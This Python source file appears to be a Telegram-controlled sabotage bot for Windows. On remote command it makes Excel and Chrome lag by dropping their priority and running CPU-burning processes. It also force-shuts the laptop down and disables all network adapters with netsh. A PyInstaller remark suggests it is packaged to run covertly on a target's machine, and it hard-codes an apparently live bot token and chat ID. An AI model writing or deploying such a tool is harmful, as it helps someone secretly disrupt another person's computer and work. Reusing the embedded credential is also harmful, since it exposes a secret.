import psutil
import multiprocessing
import subprocess
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==== НАСТРОЙКИ ====
BOT_TOKEN = "8861206755:AAGxI5J3aRjxX7pF1Ch-_zAC-QQAETeHON4"
YOUR_CHAT_ID = 7208187858  # ваш числовой ID

SLOW_MODE = False
CHROME_LAG_MODE = False
_burn_procs = []

def _auth(update: Update):
    return update.effective_chat.id == YOUR_CHAT_ID

# ==== EXCEL ====
def _set_excel_priority(priority):
    changed = 0
    for p in psutil.process_iter(['name']):
        try:
            if p.info['name'] and 'excel' in p.info['name'].lower():
                p.nice(priority)
                changed += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return changed

# ==== CHROME ====
def _set_chrome_priority(priority):
    changed = 0
    for p in psutil.process_iter(['name']):
        try:
            if p.info['name'] and 'chrome' in p.info['name'].lower():
                p.nice(priority)
                changed += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return changed

async def _chrome_lag_loop():
    """Повторно применяет IDLE к Chrome, т.к. новые вкладки создают процессы с нормальным приоритетом."""
    while CHROME_LAG_MODE:
        _set_chrome_priority(psutil.IDLE_PRIORITY_CLASS)
        await asyncio.sleep(2)

# ==== ФОНОВАЯ НАГРУЗКА ====
def _burn_cpu():
    while True:
        pass

def _start_light_load():
    n = max(1, multiprocessing.cpu_count() // 2)
    for _ in range(n):
        p = multiprocessing.Process(target=_burn_cpu)
        p.start()
        _burn_procs.append(p)

def _stop_light_load():
    for p in _burn_procs:
        p.terminate()
        p.join()
    _burn_procs.clear()

# ==== КОМАНДЫ ====
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _auth(update): return
    await update.message.reply_text(
        "Бот готов.\n"
        "/slow — тормозить Excel\n"
        "/normal — вернуть Excel\n"
        "/lagchrome — тормозить Chrome\n"
        "/unchrome — вернуть Chrome\n"
        "/shutdown — выключить ноутбук\n"
        "/killnetwork — отключить всю сеть\n"
        "/status — состояние"
    )

async def cmd_slow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global SLOW_MODE
    if not _auth(update): return
    if SLOW_MODE:
        await update.message.reply_text("Уже включено.")
        return
    n = _set_excel_priority(psutil.IDLE_PRIORITY_CLASS)
    _start_light_load()
    SLOW_MODE = True
    await update.message.reply_text(f"Торможение Excel ВКЛ. Процессов: {n}")

async def cmd_normal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global SLOW_MODE
    if not _auth(update): return
    n = _set_excel_priority(psutil.NORMAL_PRIORITY_CLASS)
    _stop_light_load()
    SLOW_MODE = False
    await update.message.reply_text(f"Excel в норме. Процессов: {n}")

async def cmd_lagchrome(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global CHROME_LAG_MODE
    if not _auth(update): return
    if CHROME_LAG_MODE:
        await update.message.reply_text("Chrome уже залаган.")
        return
    CHROME_LAG_MODE = True
    n = _set_chrome_priority(psutil.IDLE_PRIORITY_CLASS)
    _start_light_load()
    asyncio.create_task(_chrome_lag_loop())
    await update.message.reply_text(f"Chrome залаган. Процессов: {n}")

async def cmd_unchrome(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global CHROME_LAG_MODE
    if not _auth(update): return
    CHROME_LAG_MODE = False
    n = _set_chrome_priority(psutil.NORMAL_PRIORITY_CLASS)
    _stop_light_load()
    await update.message.reply_text(f"Chrome восстановлен. Процессов: {n}")

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _auth(update): return
    await update.message.reply_text(
        f"Excel торможение: {'ВКЛ' if SLOW_MODE else 'ВЫКЛ'}\n"
        f"Chrome торможение: {'ВКЛ' if CHROME_LAG_MODE else 'ВЫКЛ'}\n"
        f"Фоновых процессов: {len(_burn_procs)}"
    )

async def cmd_shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _auth(update): return
    await update.message.reply_text("Выключение...")
    subprocess.run("shutdown /s /t 0 /f", shell=True)

async def cmd_killnetwork(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _auth(update): return
    await update.message.reply_text("Отключаю сеть...")
    result = subprocess.run('netsh interface show interface', shell=True, capture_output=True, text=True)
    lines = result.stdout.strip().split('\n')[2:]
    for line in lines:
        if line.strip():
            name = line.split()[-1]
            subprocess.run(f'netsh interface set interface "{name}" admin=disable', shell=True)
    await update.message.reply_text("Сеть отключена.")

# ==== ЗАПУСК ====
def main():
    multiprocessing.freeze_support()  # ВАЖНО для PyInstaller
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("slow", cmd_slow))
    app.add_handler(CommandHandler("normal", cmd_normal))
    app.add_handler(CommandHandler("lagchrome", cmd_lagchrome))
    app.add_handler(CommandHandler("unchrome", cmd_unchrome))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("shutdown", cmd_shutdown))
    app.add_handler(CommandHandler("killnetwork", cmd_killnetwork))
    app.run_polling()

if __name__ == "__main__":
    main()